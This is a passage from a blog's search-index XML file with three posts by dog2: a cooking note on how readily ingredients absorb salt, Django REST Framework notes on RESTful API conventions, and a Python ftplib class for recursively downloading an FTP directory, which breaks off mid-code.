<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>二厨笔记 #1: 食材吸盐度小结</title>
    <url>/life/dog2s-cooking-notes-1/</url>
    <content><![CDATA[<ul>
<li>Title(EN): <em><strong>Dog2’s Cooking Notes #1: Salt Absorption Rate of Food Ingredients</strong></em></li>
<li>Author: dog2</li>
</ul>
<hr>
<blockquote>
<p>学习炒菜已两月有余，觉得有些普适性的经验值得总结，便在此记录一下。</p>
<p>本篇总结一下不同食材的吸盐度。</p>
</blockquote>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一道菜通常由多种食材混合烹制而成，其咸味轻重会直接影响口感。不同食材对盐的吸收能力不尽相同，因此较好地平衡不同食材的咸度是佳作的重要因素之一。但网上绝大多数菜谱或教程很少考虑这一点，大多数菜谱都是在所有食材都已入锅且烹制即将完成前放入盐的，这容易造成一道菜最终由于不同食材咸淡不均而影响口感。</p>
<h2 id="食材吸盐度表"><a href="#食材吸盐度表" class="headerlink" title="食材吸盐度表"></a>食材吸盐度表</h2><ul>
<li>下表记录在炒制或煮制过程中不同食材对盐的吸收难易程度，完全根据个人经验，因此未必准确，如有不妥欢迎指正。</li>
<li>虽然此表反应的是吸盐难易程度，但也可引申为相关食材入味（酸/甜/苦/辣）的难易程度。</li>
<li>可以参考下表调整烹制时食材的形状，或调整盐与各种食材入锅的先后，以平衡不同食材的咸度。</li>
<li>吸盐度0-5分，5分表示极易吸盐，0分表示极难吸盐。</li>
</ul>
<a id="more"></a>

<table>
<thead>
<tr>
<th align="center">食材</th>
<th align="center">形状</th>
<th align="center">吸盐度</th>
</tr>
</thead>
<tbody><tr>
<td align="center">白菜</td>
<td align="center">叶片</td>
<td align="center">2.8</td>
</tr>
<tr>
<td align="center">白萝卜</td>
<td align="center">切片</td>
<td align="center">3.5</td>
</tr>
<tr>
<td align="center">包菜</td>
<td align="center">手撕片</td>
<td align="center">3</td>
</tr>
<tr>
<td align="center">大蒜</td>
<td align="center">切碎粒</td>
<td align="center">2</td>
</tr>
<tr>
<td align="center">黄豆芽</td>
<td align="center"></td>
<td align="center">3</td>
</tr>
<tr>
<td align="center">胡萝卜</td>
<td align="center">丁</td>
<td align="center">2.5</td>
</tr>
<tr>
<td align="center">茄子</td>
<td align="center">丁/条</td>
<td align="center">4.5</td>
</tr>
<tr>
<td align="center">鸡蛋</td>
<td align="center">搅拌后煎块</td>
<td align="center">3.6</td>
</tr>
<tr>
<td align="center">鸡蛋</td>
<td align="center">搅拌后入汤</td>
<td align="center">3.4</td>
</tr>
<tr>
<td align="center">金针菇</td>
<td align="center"></td>
<td align="center">4</td>
</tr>
<tr>
<td align="center">木耳</td>
<td align="center">小朵</td>
<td align="center">1.5</td>
</tr>
<tr>
<td align="center">藕</td>
<td align="center">丁</td>
<td align="center">3.4</td>
</tr>
<tr>
<td align="center">青椒</td>
<td align="center">丝</td>
<td align="center">1.5</td>
</tr>
<tr>
<td align="center">土豆</td>
<td align="center">薄片</td>
<td align="center">2.8</td>
</tr>
<tr>
<td align="center">土豆</td>
<td align="center">细丝</td>
<td align="center">2.8</td>
</tr>
<tr>
<td align="center">杏鲍菇</td>
<td align="center">切片</td>
<td align="center">3</td>
</tr>
<tr>
<td align="center">有机花菜</td>
<td align="center">切小朵</td>
<td align="center">2</td>
</tr>
<tr>
<td align="center">猪肉</td>
<td align="center">排骨</td>
<td align="center">3</td>
</tr>
<tr>
<td align="center">猪肉</td>
<td align="center">丝/丁</td>
<td align="center">3.2</td>
</tr>
</tbody></table>
<h2 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h2><p>尽信书不如无书，菜谱亦然（，我朝一些书“超然”，比如某几门教科书@_@ 。。）。在看完菜谱并了解了其中不同食材的入锅顺序后，可结合上表总结的食材吸盐度来调整盐的放入方式，如可将菜谱中常见的起锅前一次性放入盐的方式改为分次放入，并合适掌控放入量，甚至可以考虑相应地更改食材的放入顺序，相信有时可以收获超越原菜谱水准的意外惊喜。</p>
<p>接下来的几篇会分享一些基于这种方法改良原有菜谱或者“创造”新菜谱的经验。</p>
<p>祝君烧得一手好菜~</p>
]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Cooking</tag>
        <tag>Dog2&#39;s Cooking Notes</tag>
        <tag>Foodie</tag>
      </tags>
  </entry>
  <entry>
    <title>Django REST Framework 学习笔记（一）：RESTful API 初探</title>
    <url>/tech/drf-learning-notes-1-hello-restful-api/</url>
    <content><![CDATA[<ul>
<li>Title(EN): <em><strong>Django REST Framework Learning Notes (1): Hello RESTful API</strong></em></li>
<li>Author: dog2</li>
</ul>
<hr>
<blockquote>
<p>前后端分离是大势所趋</p>
</blockquote>
<h1 id="按"><a href="#按" class="headerlink" title="按"></a>按</h1><p>最近在学习Django Rest Framework，<span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy90dXRvcmlhbC9xdWlja3N0YXJ0Lw==">官方教程<i class="fa fa-external-link-alt"></i></span>较短，看完感觉并没有学习到最佳实践，对DRF的了解还是不成体系。官方API文档虽然详细一些，但内容多且零散更适合查阅，对于系统性学习来说还是差了一点。</p>
<p>于是找到了<span class="exturl" data-url="aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3ZpZGVvL0JWMW5FNDExSjdoeA==">一套不错DRF讲解视频<i class="fa fa-external-link-alt"></i></span>来学习，并且在这里记下学习笔记。</p>
<p>参考了这两位同学的笔记，大部分是视频讲师在视频里做过的课堂笔记。</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vd2FuZ2N1aWNhbi9jYXRlZ29yeS8xNjA3ODIyLmh0bWw=">随笔分类 - Django REST framework笔记<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20veWFuZ2ppYW9zaG91L2NhdGVnb3J5LzE2NzUwMjEuaHRtbA==">随笔分类 - Django–drf相关 <i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>根据我个人理解对笔记做了部分修改、整理和补充。这里有我的<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RvZy0yL2hlbGxvX2RyZg==">测试代码<i class="fa fa-external-link-alt"></i></span>可供参考，包括django项目、db数据和postman的测试数据包。</p>
<h1 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h1><ul>
<li><strong><span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU4JUExJUE4JUU3JThFJUIwJUU1JUIxJTgyJUU3JThBJUI2JUU2JTgwJTgxJUU4JUJEJUFDJUU2JThEJUEy">RESTful<i class="fa fa-external-link-alt"></i></span></strong>: Representational State Transfer 表现层状态转换</li>
<li><strong>ful</strong>: 形容词后缀，表示“（这一）类的、（这种）风格的”</li>
<li><strong><span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3poLWNuLyVFNSVCQSU5NCVFNyU5NCVBOCVFNyVBOCU4QiVFNSVCQSU4RiVFNiU4RSVBNSVFNSU4RiVBMw==">API<i class="fa fa-external-link-alt"></i></span></strong>: Application Programming Interface 应用程序接口</li>
<li><strong>接口</strong>：联系两个物质的媒介，完成信息交互</li>
<li><strong>Web程序接口</strong><ul>
<li>功能：联系前台页面与后台数据库的媒介</li>
<li>组成<ul>
<li>url: 长得像返回数据的url链接</li>
<li>请求参数: 前台按照指定的key提供数据给后台</li>
<li>响应数据: 后台与数据库交互后将数据反馈给前台</li>
</ul>
</li>
</ul>
</li>
</ul>
<a id="more"></a>

<h1 id="RESTful-API"><a href="#RESTful-API" class="headerlink" title="RESTful API"></a>RESTful API</h1><h2 id="接口规范"><a href="#接口规范" class="headerlink" title="接口规范"></a>接口规范</h2><ul>
<li>功能：为了采用不同的后台语言，也能使用同样的接口，获取到同样的数据</li>
<li>接口：<ul>
<li>url</li>
<li>相应数据</li>
</ul>
</li>
<li>接口文档：<ul>
<li>url + 请求参数</li>
<li>响应数据</li>
</ul>
</li>
</ul>
<h2 id="URL规范"><a href="#URL规范" class="headerlink" title="URL规范"></a>URL规范</h2><p>RESFful API的URL应包含如下部分：</p>
<h3 id="用api关键字标识接口url"><a href="#用api关键字标识接口url" class="headerlink" title="用api关键字标识接口url"></a>用api关键字标识接口url</h3><p>如</p>
<ul>
<li>api.baidu.com</li>
<li><span class="exturl" data-url="aHR0cDovL3d3dy5iYWlkdS5jb20vYXBp">www.baidu.com/api<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h3 id="优先选择https协议"><a href="#优先选择https协议" class="headerlink" title="优先选择https协议"></a>优先选择https协议</h3><p>接口数据安全性考量</p>
<h3 id="版本标识"><a href="#版本标识" class="headerlink" title="版本标识"></a>版本标识</h3><p>如</p>
<ul>
<li>api.baidu.com/v1/…</li>
<li>api.baidu.com/v2/…</li>
</ul>
<h3 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h3><p>接口操作的数据对象，在url中一般采用资源（名词）复数形式。一个接口可以包含对该资源的多种操作方式。如</p>
<ul>
<li>api.baidu.com/books</li>
<li>api.baidu.com/books/(pk)</li>
</ul>
<h3 id="请求方法"><a href="#请求方法" class="headerlink" title="请求方法"></a>请求方法</h3><p><span class="exturl" data-url="aHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvemgtQ04vZG9jcy9XZWIvSFRUUC9NZXRob2Rz">HTTP请求方法<i class="fa fa-external-link-alt"></i></span>，标识操作资源的方式，如</p>
<ul>
<li><code>GET /books/</code> &amp; <code>GET /books/(pk)</code>: 获取所有/获取一个</li>
<li><code>POST /books/</code>: 增加一个(多个)</li>
<li><code>DELETE /books/(pk)</code>: 删除一个</li>
<li><code>PUT /books/(pk)</code>: 整体更新一个</li>
<li><code>PATCH /books/(pk)</code>: 局部更新一个</li>
</ul>
<h3 id="请求参数"><a href="#请求参数" class="headerlink" title="请求参数"></a>请求参数</h3><p>往往涉及数据的各种过滤操作及表现形式 - 筛选、排序、限制，如</p>
<ul>
<li>api.baidu.com/books/?search=西&amp;ordering=-price&amp;limit=3</li>
</ul>
<h2 id="响应数据"><a href="#响应数据" class="headerlink" title="响应数据"></a>响应数据</h2><p>API返回的数据，一般为Json格式，如</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="attr">"errcode"</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">"msg"</span>: <span class="string">"Query success."</span>,</span><br><span class="line">    <span class="attr">"body"</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">"type"</span>: <span class="number">2</span>,</span><br><span class="line">            <span class="attr">"location"</span>: <span class="string">"116.298457,39.848625"</span>,</span><br><span class="line">            <span class="attr">"radius"</span>: <span class="number">41</span>,</span><br><span class="line">            <span class="attr">"country"</span>: <span class="string">"中国"</span>,</span><br><span class="line">            <span class="attr">"province"</span>: <span class="string">"北京市"</span>,</span><br><span class="line">            <span class="attr">"city"</span>: <span class="string">"北京市"</span>,</span><br><span class="line">            <span class="attr">"citycode"</span>: <span class="string">"131"</span>,</span><br><span class="line">            <span class="attr">"district"</span>: <span class="string">"丰台区"</span>,</span><br><span class="line">            <span class="attr">"road"</span>: <span class="string">"丰台南路44号"</span>,</span><br><span class="line">            <span class="attr">"ctime"</span>: <span class="string">"1551178833"</span>,</span><br><span class="line">            <span class="attr">"indoor"</span>: <span class="string">"1"</span>,</span><br><span class="line">            <span class="attr">"error"</span>: <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li>响应状态码：由开发者（前端、后端、客户）定义，是对资源请求结果的应用层状态码，非HTTP响应状态码。<ul>
<li>常见字段名示例：<ul>
<li><code>&quot;status&quot;</code></li>
<li><code>&quot;errcode&quot;</code></li>
</ul>
</li>
<li>常见值示例：<ul>
<li><code>0</code>: 表示操作资源成功</li>
<li><code>1</code>: 表示操作资源失败</li>
<li><code>2</code>: 表示操作资源成功，但没匹配结果</li>
</ul>
</li>
</ul>
</li>
<li>响应状态码文字说明<ul>
<li>常见字段名示例<ul>
<li><code>&quot;msg&quot;</code></li>
<li><code>&quot;message&quot;</code></li>
</ul>
</li>
</ul>
</li>
<li>资源本身 <ul>
<li>常见字段名示例<ul>
<li><code>&quot;data&quot;</code></li>
<li><code>&quot;results&quot;</code></li>
</ul>
</li>
</ul>
</li>
</ol>
<p>注意：不能直接返回的资源(子资源、图片、视频等资源)，而是返回该资源的url链接</p>
<h1 id="基于restful规范的原生Django接口"><a href="#基于restful规范的原生Django接口" class="headerlink" title="基于restful规范的原生Django接口"></a>基于restful规范的原生Django接口</h1><p>测试代码及数据请参见 <a href="https://github.com/dog-2/hello_drf/tree/master/no1_my_restapi" target="_blank" rel="noopener">demo项目 <code>no1_my_restapi</code></a></p>
<div class="note warning">
            <p>原生接口对<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdqdW41MTU5L2FydGljbGUvZGV0YWlscy80Nzc4MTQ0Mw==">各种格式的POST数据<i class="fa fa-external-link-alt"></i></span>的支持情况如下：</p><ul><li><input checked="" disabled="" type="checkbox"> form-data</li><li><input checked="" disabled="" type="checkbox"> x-www-form-urlencoded</li><li><input disabled="" type="checkbox"> <del>raw：包括 常见的json、xml等</del></li></ul><p>也就是说 <strong>原生接口并不支持对POST请求中json数据的自动解析，后端只能拿到整个json字符串</strong></p>
          </div>

<h1 id="DRF-Django-REST-Framework"><a href="#DRF-Django-REST-Framework" class="headerlink" title="DRF - Django REST Framework"></a>DRF - Django REST Framework</h1><p>DRF有如下主要模块：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework.views <span class="keyword">import</span> APIView, ...                      <span class="comment"># 视图模块 - 对django原生视图类的封装</span></span><br><span class="line"><span class="keyword">from</span> rest_framework.response <span class="keyword">import</span> Response, ...                  <span class="comment"># 响应模块 - 对django原生响应类的封装</span></span><br><span class="line"><span class="keyword">from</span> rest_framework.request <span class="keyword">import</span> Request, ...                    <span class="comment"># 请求模块 - 对django原生请求类的封装</span></span><br><span class="line"><span class="keyword">from</span> rest_framework.serializers <span class="keyword">import</span> Serializer, ...             <span class="comment"># 序列化与反序列化模块</span></span><br><span class="line"><span class="keyword">from</span> rest_framework.settings <span class="keyword">import</span> APISettings                    <span class="comment"># DRF的配置文件</span></span><br><span class="line"><span class="keyword">from</span> rest_framework.filters <span class="keyword">import</span> SearchFilter, ...               <span class="comment"># RESTful API 基础功能 - 过滤</span></span><br><span class="line"><span class="keyword">from</span> rest_framework.pagination <span class="keyword">import</span> PageNumberPagination, ...    <span class="comment"># RESTful API 基础功能 - 分页</span></span><br><span class="line"><span class="keyword">from</span> rest_framework.authentication <span class="keyword">import</span> TokenAuthentication, ... <span class="comment"># RESTful API 基础功能 - 认证</span></span><br><span class="line"><span class="keyword">from</span> rest_framework.permissions <span class="keyword">import</span> IsAuthenticated, ...        <span class="comment"># RESTful API 基础功能 - 权限（是否登录）</span></span><br><span class="line"><span class="keyword">from</span> rest_framework.throttling <span class="keyword">import</span> SimpleRateThrottle           <span class="comment"># RESTful API 基础功能 - 频率</span></span><br></pre></td></tr></table></figure>

<p>可以看到 DRF 在 django原有基础上进行类封装，并实现类 RESTful API的各大基础功能。</p>
<p>原生View不同，DRF实现了对json格式的POST请求数据的自动解析：</p>
<ul>
<li><input checked="" disabled="" type="checkbox"> form-data</li>
<li><input checked="" disabled="" type="checkbox"> x-www-form-urlencoded</li>
<li><input checked="" disabled="" type="checkbox"> raw：包括 常见的json、xml等</li>
</ul>
<h1 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h1><ul>
<li><strong><span class="exturl" data-url="aHR0cHM6Ly93d3cucmVzdGFwaXR1dG9yaWFsLmNvbS8=">A RESTful Tutorial<i class="fa fa-external-link-alt"></i></span></strong></li>
<li><strong>API Design Cheat Sheet</strong>: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1Jlc3RDaGVhdFNoZWV0L2FwaS1jaGVhdC1zaGVldC9ibG9iL21hc3Rlci9SRUFETUUtemgtSGFucy5tZA==">中文<i class="fa fa-external-link-alt"></i></span> / <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1Jlc3RDaGVhdFNoZWV0L2FwaS1jaGVhdC1zaGVldCNhcGktZGVzaWduLWNoZWF0LXNoZWV0">EN<i class="fa fa-external-link-alt"></i></span></li>
</ul>
]]></content>
      <categories>
        <category>Tech</category>
      </categories>
      <tags>
        <tag>Tech</tag>
        <tag>Backend</tag>
        <tag>Django</tag>
        <tag>Django REST FrameWork</tag>
        <tag>DRF</tag>
        <tag>Learning Notes</tag>
        <tag>Dev</tag>
      </tags>
  </entry>
  <entry>
    <title>Python实现下载FTP服务器的整个目录（文件夹）</title>
    <url>/tech/downloading-ftp-directory-recursively-with-python/</url>
    <content><![CDATA[<ul>
<li>Title(EN): <em><strong>Downloading FTP Directory Recursively with Python</strong></em></li>
<li>Author: dog2</li>
</ul>
<hr>
<h3 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h3><ul>
<li>快速批量下载多个FTP服务器的上的目录（指定目录或整个目录）。</li>
</ul>
<a id="more"></a>

<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><ul>
<li>核心问题：针对一个FTP Server，要能够下载其指定目录。即递归遍历所有目录，针对每个目录中的子目录，创建本地相应目录；针对每个目录中的文件，下载到本地相应目录。</li>
<li>下载所有文件的过程最好也是可并发的，以加快整个下载过程。</li>
</ul>
<h3 id="前车之轮"><a href="#前车之轮" class="headerlink" title="前车之轮"></a>前车之轮</h3><p>需求及实现思路已经清楚，剩下的就是编码测试了。</p>
<p>按照惯例，为避免重复造轮子，在开工前有必要上谷歌百度一下，确定前人是否已经造出了好用的轮子。<br>找到如下几个：</p>
<ol>
<li><span class="exturl" data-url="aHR0cDovL3d3dy5qYjUxLm5ldC9hcnRpY2xlLzMzOTg2Lmh0bQ==">通过python下载FTP上的文件夹的实现代码<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cDovL2Nhbmx5bmV0Lml0ZXllLmNvbS9ibG9nLzgzNjk5Ng==">python实现的ftp自动上传下载程序（支持目录递归操作）<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cDovL3d3dy5qYjUxLm5ldC9hcnRpY2xlLzY3MTk2Lmh0bQ==">python实现支持目录FTP上传下载文件的方法<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9weXBpLnB5dGhvbi5vcmcvcHlwaS9mdHB1dGlsLzMuMg==">python第三方库 ftputil<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9weXBpLnB5dGhvbi5vcmcvcHlwaS9weWZ0cHN5bmMvMS4wLjM=">python第三方库 pyftpsync<i class="fa fa-external-link-alt"></i></span></li>
</ol>
<p>逐一测试，都不太好用。</p>
<p>1在现实时使用os.chdir切换本地下载目录，批量下载（多线程并发下载多个服务器目录）时会产生目录混乱。</p>
<p>3在下载每个文件都需要执行ls函数确认其存在于远程目录，性能很低。</p>
<p>使用2 4 5没有成功下载过，可能是用法不对，粗略扫了下文档和源码，也没找到正确用法。如果你知道正确用法，还请指点。</p>
<h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>既然前人的轮子都不太好用，只好再造一个。相对其他协议而言，FTP协议还是比较复杂的，因此最好基于已有的FTP库来实现，python的自带FTP库是ftplib，这里就选用它。</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLnB5dGhvbi5vcmcvMi9saWJyYXJ5L2Z0cGxpYi5odG1s">文档<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3B5dGhvbi9jcHl0aG9uL2Jsb2IvMi43L0xpYi9mdHBsaWIucHk=">源码<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>大概实现思路及流程已在0x01中指出，这里可能需要用到ftplib中的两个函数</p>
<ul>
<li><strong>ftplib.FTP.dir()</strong> : 用于列举目录信息，其内部实现调用的是FTP协议中的LIST请求，输出格式类似linux下的命令_<strong>ls -alh</strong>_。这里需要注意，默认情况下，该函数是不返回目录信息的字符串的，它在内部实现中调用了ftplib.FTP.retrlines()函数得到返回数据的每一行，并默认使用println函数处理每行数据，即打印至标准输出。当然，处理每行数据的函数是可以被替换的，在dir()函数的参数中指出即可。尽管如此还是难以将目录信息存入到一个字符串并返回，以供我们后续调用。在0x02中提到的3是通过是给dir函数传入自定义类的实例函数，并将目录信息存储在自定义类的实例变量中来得到这个值的。当然，也可以通过自定义函数结合全局变量的方式来得到这个值。这种实现略显蹩脚，因此在这里，我们参照原有dir函数的实现方式，在自定义类中实现一个新的dir函数，它不用再传入处理每行数据的函数，且能够返回目录信息。</li>
<li><strong>ftplib.FTP.retrbinary()</strong> : 用于指定并发送某种FTP请求，并以二进制数据接收响应。这里使用它来执行FTP协议中的RETR命令，以下载FTP服务器上指定路径的文件。</li>
</ul>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p>实现代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> ftplib</span><br><span class="line"><span class="keyword">import</span> traceback</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FtpDownloader</span><span class="params">(object)</span>:</span></span><br><span class="line">    PATH_TYPE_UNKNOWN = <span class="number">-1</span></span><br><span class="line">    PATH_TYPE_FILE = <span class="number">0</span></span><br><span class="line">    PATH_TYPE_DIR = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, host, user=None, passwd=None, port=<span class="number">21</span>, timeout=<span class="number">10</span>)</span>:</span></span><br><span class="line">        self.conn = ftplib.FTP(</span><br><span class="line">            host=host,</span><br><span class="line">            user=user,</span><br><span class="line">            passwd=passwd,</span><br><span class="line">            timeout=timeout</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dir</span><span class="params">(self, *args)</span>:</span></span><br><span class="line">        <span class="string">'''</span></span><br><span class="line"><span class="string">        by defualt, ftplib.FTP.dir() does not return any value.</span></span><br><span class="line"><span class="string">        Instead, it prints the dir info to the stdout.</span></span><br><span class="line"><span class="string">        So we re-implement it in FtpDownloader, which is able to return the dir info.</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        info = []</span><br><span class="line">        cmd = <span class="string">'LIST'</span></span><br><span class="line">        <span class="keyword">for</span> arg <span class="keyword">in</span> args:</span><br><span class="line">            <span class="keyword">if</span> arg:</span><br><span class="line">                cmd = cmd + (<span class="string">' '</span> + arg)</span><br><span class="line">        self.conn.retrlines(cmd, <span class="keyword">lambda</span> x: info.append(x.strip().split()))</span><br><span class="line">        <span class="keyword">return</span> info</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tree</span><span class="params">(self, rdir=None, init=True)</span>:</span></span><br><span class="line">        <span class="string">'''</span></span><br><span class="line"><span class="string">        recursively get the tree structure of a directory on FTP Server.</span></span><br><span class="line"><span class="string">        args:</span></span><br><span class="line"><span class="string">            rdir - remote direcotry path of the FTP Server.</span></span><br><span class="line"><span class="string">            init - flag showing whether in a recursion.</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        <span class="keyword">if</span> init <span class="keyword">and</span> rdir <span class="keyword">in</span> (<span class="string">'.'</span>, <span class="literal">None</span>):</span><br><span class="line">            rdir = self.conn.pwd()</span><br><span class="line">        tree = []</span><br><span class="line">        tree.append((rdir, self.PATH_TYPE_DIR))</span><br><span class="line"></span><br><span class="line">        dir_info = self.dir(rdir)</span><br><span class="line">        <span class="keyword">for</span> info <span class="keyword">in</span> dir_info:</span><br><span class="line">            attr = info[<span class="number">0</span>]  <span class="comment"># attribute</span></span><br><span class="line">            name = info[<span class="number">-1</span>]</span><br><span class="line">            path = os.path.join(rdir, name)</span><br><span class="line">            <span class="keyword">if</span> attr.startswith(<span class="string">'-'</span>):</span><br><span class="line">                tree.append((path, self.PATH_TYPE_FILE))</span><br><span class="line">            <span class="keyword">elif</span> attr.startswith(<span class="string">'d'</span>):</span><br><span class="line">                <span class="keyword">if</span> (name == <span class="string">'.'</span> <span class="keyword">or</span> name == <span class="string">'..'</span>):  <span class="comment"># skip . and ..</span></span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                tree.extend(self.tree(rdir=path,init=<span class="literal">False</span>))  <span class="comment"># recurse</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                tree.append(path, self.PATH_TYPE_UNKNOWN)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> tree</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">downloadFile</span><span class="params">(self, rfile, lfile)</span>:</span></span><br><span class="line">        <span class="string">'''</span></span><br><span class="line"><span class="string">        download a file with path %rfile on a FTP Server and save it to locate</span></span><br><span class="line"><span class="string">        path %lfile.</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        ldir = os.path.dirname(lfile)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(ldir):</span><br><span class="line">            os.makedirs(ldir)</span><br><span class="line">        f = open(lfile, <span class="string">'wb'</span>)</span><br><span class="line">        self.conn.retrbinary(<span class="string">'RETR %s'</span> % rfile, f.write)</span><br><span class="line">        f.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">treeStat</span><span class="params">(self, tree)</span>:</span></span><br><span class="line">        numDir = <span class="number">0</span></span><br><span class="line">        numFile = <span class="number">0</span></span><br><span class="line">        numUnknown = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> path, pathType <span class="keyword">in</span> tree:</span><br><span class="line">            <span class="keyword">if</span> pathType == self.PATH_TYPE_DIR:</span><br><span class="line">                numDir += <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> pathType == self.PATH_TYPE_FILE:</span><br><span class="line">                numFile += <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> pathType == self.PATH_TYPE_UNKNOWN:</span><br><span class="line">                numUnknown += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> numDir, numFile, numUnknown</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">downloadDir</span><span class="params">(self, rdir=<span class="string">'.'</span>, ldir=<span class="string">'.'</span>, tree=None,</span></span></span><br><span class="line"><span class="function"><span class="params">                    errHandleFunc=None, verbose=True)</span>:</span></span><br><span class="line">        <span class="string">'''</span></span><br><span class="line"><span class="string">        download a direcotry with path %rdir on a FTP Server and save it to</span></span><br><span class="line"><span class="string">        locate path %ldir.</span></span><br><span class="line"><span class="string">        args:</span></span><br><span class="line"><span class="string">            tree - the tree structure return by function FtpDownloader.tree()</span></span><br><span class="line"><span class="string">            errHandleFunc - error handling function when error happens in</span></span><br><span class="line"><span class="string">                downloading one file, such as a function that writes a log.</span></span><br><span class="line"><span class="string">                By default, the error is print to the stdout.</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> tree:</span><br><span class="line">            tree = self.tree(rdir=rdir, init=<span class="literal">True</span>)</span><br><span class="line">        numDir, numFile, numUnknown = self.treeStat(tree)</span><br><span class="line">        <span class="keyword">if</span> verbose:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'Host %s tree statistic:'</span> % self.conn.host</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'%d directories, %d files, %d unknown type'</span> % (</span><br><span class="line">                numDir,</span><br><span class="line">                numFile,</span><br><span class="line">                numUnknown</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(ldir):</span><br><span class="line">            os.makedirs(ldir)</span><br><span class="line">        ldir = os.path.abspath(ldir)</span><br><span class="line"></span><br><span class="line">        numDownOk = <span class="number">0</span></span><br><span class="line">        numDownErr = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> rpath, pathType <span class="keyword">in</span> tree:</span><br><span class="line">            lpath = os.path.join(ldir, rpath.strip(<span class="string">'/'</span>).strip(<span class="string">'\\'</span>))</span><br><span class="line">            <span class="keyword">if</span> pathType == self.PATH_TYPE_DIR:</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(lpath):</span><br><span class="line">                    os.makedirs(lpath)</span><br><span class="line">            <span class="keyword">elif</span> pathType == self.PATH_TYPE_FILE:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    self.downloadFile(rpath, lpath)</span><br><span class="line">                    numDownOk += <span class="number">1</span></span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line">                    numDownErr += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">if</span> errHandleFunc:</span><br><span class="line">                        